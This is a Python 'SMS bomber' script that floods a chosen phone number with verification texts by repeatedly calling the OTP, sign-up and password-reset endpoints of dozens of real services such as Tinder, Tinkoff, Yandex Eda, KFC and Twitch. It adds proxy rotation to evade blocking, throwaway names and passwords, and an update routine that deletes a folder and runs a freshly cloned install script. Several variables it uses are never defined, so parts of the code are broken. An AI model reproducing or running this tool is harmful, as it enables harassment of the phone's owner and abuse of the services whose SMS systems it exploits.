#!/usr/bin/python3
# Author: @Mrxanon
# https://github.com/Mr-X-01/Bomber
import os
def MAIN():
	try:
		import requests
		import random
		import datetime
		import sys
		import re
		import time
		import datetime
		import json
		import threading
		from threading import Thread
		from colorama import Fore, Back, Style
		from random import randint
		def Main():
			global phone
			global info
			global proxy
			global ssl
			global proxies

			def mask(str, maska):
				if len(str) == maska.count('#'):
					str_list = list(str)
					for i in str_list:
						maska=maska.replace("#", i, 1)
					return maska

			def sms():
				global phone
				global name
				global password
				global email
				global proxies
				phone9 = phone[1:]
				try:
					try:
						requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': _phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': _phonePizzahut, '_token':'*'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})	
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': '+7 915 3509908','g-recaptcha-response': '','recaptcha': 'on'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})	
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})	
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + self.formatted_phone, "api": 2, "email": "email","x-email": "x-email"})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": self.formatted_phone, "recaptcha": 'off', "g-recaptcha-response": ""})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://plink.tech/register/',json={"phone": self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("http://smsgorod.ru/sendsms.php",data={"number": self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": self.formatted_phone,"username": username})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': self.formatted_phone},headers={'App-ID': 'cabinet'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": self.formatted_phone, "type": 2})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": self.formatted_phone, "deliveryOption": "sms"})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://belkacar.ru/get-confirmation-code',data={'phone': self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": self.formatted_phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.citilink.ru/registration/confirm/phone/+'+_phone+'/')
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': _name,'phone': _phone, 'promo': 'yellowforma'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.get('https://www.oyorooms.com/api/pwa/generateotp?phone='+_phone9+'&country_code=%2B7&nod=4&locale=en')
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCodeForOtp', params={'pageName': 'loginByUserPhoneVerification', 'fromCheckout': 'false','fromRegisterPage': 'true','snLogin': '','bpg': '','snProviderId': ''}, data={'phone': _phone,'g-recaptcha-response': '','recaptcha': 'on'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {'client': {'firstName': 'Иван', 'lastName': 'Иванов', 'phone': _phone,'typeKeys': ['Unemployed']}},'query': 'mutation registration($client: ClientInput!) {''\n  registration(client: $client) {''\n    token\n    __typename\n  }\n}\n'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/', json={'client_type': 'personal', 'email': _email, 'mobile_phone': _phone, 'deliveryOption': 'sms'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://online.sbis.ru/reg/service/', json={'jsonrpc':'2.0','protocol':'5','method':'Пользователь.ЗаявкаНаФизика','params':{'phone':_phone},'id':'1'})	
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest', json={'firstName':'Иван','middleName':'Иванович','lastName':'Иванов','sex':'1','birthDate':'10.10.2000','mobilePhone': _phone9,'russianFederationResident':'true','isDSA':'false','personalDataProcessingAgreement':'true','bKIRequestAgreement':'null','promotionAgreement':'true'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://api.carsmile.com/",json={"operationName": "enterPhone", "variables": {"phone": _phone},"query": "mutation enterPhone($phone: String!) {\n  enterPhone(phone: $phone)\n}\n"})	
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://api.delitime.ru/api/v2/signup",data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.get('https://findclone.ru/register', params={'phone': '+' + _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://guru.taxi/api/v1/driver/session/verify",json={"phone": {"code": 1, "number": _phone}})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})	
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword", data={"password": password, "application": "lkp", "login": "+" + _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate',json={"phone": _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + self.formatted_phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://plink.tech/register/',json={"phone": _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",json={"phone": _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("http://smsgorod.ru/sendsms.php",data={"number": _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://passport.twitch.tv/register?trusted_request=true',json={"birthday": {"day": 11, "month": 11, "year": 1999},"client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,"password": password, "phone_number": _phone,"username": username})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},headers={'App-ID': 'cabinet'})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://api.wowworks.ru/v2/site/send-code",json={"phone": _phone, "type": 2})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://eda.yandex/api/v1/user/request_authentication_code',json={"phone_number": "+" + _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',json={"client_type": "personal", "email": f"{email}@gmail.ru","mobile_phone": self.formatted_phone, "deliveryOption": "sms"})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
					try:
						requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
						print(Fore.GREEN + '''[+] Spam has been sent!''')
					except:
						from termcolor import colored
						print(Fore.RED + '''[-] Failed to send!''')
				except:
					pass
				
			def clear():
				os.system('cls' if os.name=='nt' else 'clear')
				pass

			def logo():
				logo = Fore.GREEN+'''
######################################
#------#8888888888888888888888#------#
##----##8888888       88888888##----##
###--###8888888  888   8888888###--###
########8888888  888   8888888########
##----##8888888       88888888##----##
########8888888  888   8888888########
###--###8888888  888   8888888###--###
##----##8888888       88  8888##----##
#------#8888888888888888888888#------#
######################################
##-----##88888888888888888888##-----##
###---###88~~~~~ᴍʀ. x ~~~~~88###---###
####-####88~~SMS Spammer ~~88####-####
###---###88~~~~@Mrxanon~~~~88###---###
##-----##88888888888888888888##-----##
######################################'''+Style.RESET_ALL+Fore.RED+'''
######################################
## Before you start using this      ##
## utility,we want to say -         ##
## that you do everything           ##
## at your own peril and risk!      ##
## We are not responsible           ##
## for what you do with this utilit!##
######################################'''+Style.RESET_ALL
				print(logo)

			def updateproxy():
				global proxy
				global ssl
				global info
				try:
					print ("Enter http(s)://IP:port proxy.")
					print ("Example: "+Fore.GREEN+"https://123.45.6.78:8080"+Style.RESET_ALL)
					print ("To cancel press Ctrl+C")
					prox = input(Fore.BLUE+"Bomber > "+Style.RESET_ALL)
					if prox[:5]=="https":
						ssl="https"
						proxy=prox[8:]
					elif prox[:5]=="http:":
						ssl="http"
						proxy=prox[7:]
					else:
						info = Fore.RED+"\nData entered incorrectly!"+Style.RESET_ALL
						proxy = "localhost"
				except:
					info = Fore.RED+"\nData entered incorrectly!"+Style.RESET_ALL
					proxy = "localhost"

			def generateproxy():
				global ssl
				global proxy
				url="https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=500&country=RU&anonymity=elite&ssl=yes"
				a=requests.get(url)
				ssl="https"
				proxy=a.text.splitlines()[0]

			def make7phone():
				global phone
				if phone[0] == '+':
					phone = phone[1:]
				if phone[0] == '8':
					phone = '7'+phone[1:]
				if phone[0] == '9':
					phone = '7'+phone

			def addparams():
				global name
				global password
				global email
				name = ''
				for x in range(12):
					name = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
					password = name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
					email = "{}@gmail.com".format(name)

			def update():
				a=input("Are you sure you want to update? (y/n) ")
				if a=="y":
					os.system("cd && rm -rf ~/Bomber && git clone https://github.com/Mr-X-01/Bomber && sh ~/Bomber/install.sh")
					exit()
				else:
					print("Canceled")

			def onesend():
				global phone
				global name
				global password
				global email
				global ssl
				global proxy
				global info
				global proxies
				clear()
				logo()
				print(info)
				print('Enter phone number ("Enter" - cancel):')
				phone = input(Fore.BLUE+"Bomber > "+Style.RESET_ALL)
				try:
					if int(phone):
						print('Enter the number of cycles ("Enter" - cancel):')
						count = input(Fore.BLUE+"Bomber > "+Style.RESET_ALL)
						try:
							if int(count):
								count=int(count)
								make7phone()
								iteration = 0
								if int:
									addparams()
									info = '\nNummber: {}\nNumber of cycles: {}'.format(phone, count)+'\nSpammer launched.\nIf you want to stop - click Ctrl+Z.'
									clear()
									logo()
									print(info)
									if proxy=="localhost":
										proxies=None
									else:
										proxies={ssl:proxy}
									while iteration < count:
										addparams()
										sms()
										iteration+=1
										print("{} cycle passed.".format(iteration))
									info = Fore.BLUE+"\nDone.\nNummber: {}\nNumber of cycles: {}".format(phone, iteration)+Style.RESET_ALL
						except:
							info=Fore.RED+"Number of cycles entered incorrectly"+Style.RESET_ALL
				except:
					info=Fore.RED+"Invalid phone number"+Style.RESET_ALL

			def n_send(phone, count, proxies):
				global name
				global password
				global email
				global info
				iteration=0
				while iteration < count:
					addparams()
					sms()
					iteration+=1
					print(Fore.GREEN+"{}".format(phone)+Style.RESET_ALL+": cycle №{} passed.".format(iteration))
				print(Fore.GREEN+"\nSpam on {} finished. Number of cycles {}".format(phone, count)+Style.RESET_ALL)
				exit()
			
			def main():
				global phone
				global info
				global proxy
				global ssl
				global proxies 
				proxy = "localhost"
				info = " "
				while True:
					clear()
					logo()
					print(info)
					print("Proxy: "+Fore.BLUE+"{}".format(proxy)+Style.RESET_ALL)
					print("1) SMS Spammer.")
					print("2) Update Proxy.")
					print("3) Update Spammer.")
					print("4) Exit.")
					input1 = input(Fore.BLUE+"Enter the number: "+Style.RESET_ALL)
					if input1 == "1":
						clear()
						onesend()
							
					elif input1 == "2":
						print("1. Remove proxy")
						print("2. Enter your proxy")
						print("3. Generate proxy")
						input51 = input(Fore.BLUE+"Bomber > "+Style.RESET_ALL)
						if input51=="1":
							proxy = "localhost"
						
						elif input51=="2":
							updateproxy()

						elif input51=="3":
							generateproxy()

					elif input1 == "3":
						update()
					
					elif input1 == "4":
						print (Fore.BLUE+"\nGood bye!\n𝕶𝖊𝖊𝖕 𝕾𝖒𝖎𝖑𝖊  - ᴍʀ. x\n"+Style.RESET_ALL)
						exit()

			main()
		Main()
		
	except ModuleNotFoundError:
		os.system('cls' if os.name=='nt' else 'clear')
		print("Press Enter to install missing libraries...")
		input()
		os.system("python -m pip install requests colorama proxyscrape")

		Main()
MAIN()
